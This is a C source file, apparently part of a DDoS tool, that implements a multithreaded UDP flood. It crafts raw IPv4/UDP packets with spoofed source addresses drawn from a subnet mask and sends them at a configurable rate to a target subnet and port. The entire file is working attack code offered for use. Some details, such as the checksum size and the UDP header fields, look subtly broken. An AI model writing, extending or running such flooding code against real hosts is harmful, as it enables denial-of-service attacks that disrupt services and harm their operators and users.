#include "header.h"
#include "base/make_ipv4.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/udp_flood.h"

#define DATA "Hello, This is Data!"

extern int g_num_threads;

// session counting
__u64 g_udp_num_total;
__u64 g_udp_num_generated_in_sec;
// from main()
InputArguments g_udp_input;
__u32 g_udp_request_per_sec;
// for masking next ip address
MaskingArguments g_udp_now;
// thread
pthread_mutex_t g_udp_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_udp_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_udp_before_time;
struct timespec g_udp_now_time;

void udp_flood_print_usage(void)
{
	printf("UDP flood Usage : "
			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
	return;
}

void *generate_udp_flood(void *data)
{
	int thread_id = *((int *)data);
	int sock = make_socket(IPPROTO_UDP);
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_udp_mutex);
		// get now resource
		get_masking_arguments(&g_udp_input, &g_udp_now);
		// make ipv4 header
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h.protocol = (IPPROTO_UDP);
		ipv4_h.saddr = inet_addr(g_udp_now.src);
		ipv4_h.daddr = inet_addr(g_udp_now.dest);
		ipv4_h.tot_len += sizeof(struct udphdr);
		ipv4_h.check = in_cksum((__u16 *) &ipv4_h,sizeof(struct udphdr) + sizeof(struct icmp));
		// make udp header
		struct udphdr *udp_h_ptr;
		char buf[sizeof(struct udphdr)];
		memset(buf, 0x00, sizeof(struct udphdr));
		udp_h_ptr = (struct udphdr *)buf;
		udp_h_ptr->checksum = 0;
		udp_h_ptr->src_port = htons(0);
		udp_h_ptr->dest_port = htons(g_udp_now.port);
		strcpy(udp_h_ptr -> data, DATA);
		udp_h_ptr->len = htons(strlen(DATA));
		// wait a second
		if (g_udp_num_generated_in_sec >= g_udp_request_per_sec) {
			pthread_cond_wait(&g_udp_cond, &g_udp_mutex);
		}
		// time checking
		time_check(
				&g_udp_cond,
				&g_udp_before_time,
				&g_udp_now_time,
				&g_udp_num_generated_in_sec);
		// make and send packet
		char *packet = packet_assemble(ipv4_h, udp_h_ptr, sizeof(struct udphdr));
		send_packet(sock, ipv4_h, packet, g_udp_now.port);
		free(packet);
		g_udp_num_generated_in_sec++;
		g_udp_num_total++;
		// *** end of critical section ***
		pthread_mutex_unlock(&g_udp_mutex);
	}
	close(sock);
	return NULL;
}

void *udp_flood_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_udp_mutex);
		time_check(
				&g_udp_cond,
				&g_udp_before_time,
				&g_udp_now_time,
				&g_udp_num_generated_in_sec);
		pthread_mutex_unlock(&g_udp_mutex);
	}
	return NULL;
}

void udp_flood_main(char *argv[])
{
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		udp_flood_print_usage();
		return;
	}
	// get ip address, mask, port
	argv_to_input_arguments(argv, &g_udp_input);
	g_udp_num_generated_in_sec = 0;
	g_udp_num_total = 0;
	memset(&g_udp_before_time, 0, sizeof(struct timespec));
	memset(&g_udp_now_time, 0, sizeof(struct timespec));
	g_udp_request_per_sec = atoi(argv[3]);
	const int num_threads = g_num_threads;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Sending UDP requests to %s using %d threads %u per sec\n",
			g_udp_input.dest, num_threads, g_udp_request_per_sec);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(
				&threads[i],
				NULL,
				generate_udp_flood,
				(void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, udp_flood_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("thread %d joined\n", i);
	}
	pthread_mutex_destroy(&g_udp_mutex);
	printf("UDP flood finished\nTotal %lu packets sent.\n", g_udp_num_total);
	pthread_exit(NULL);
	return;
}
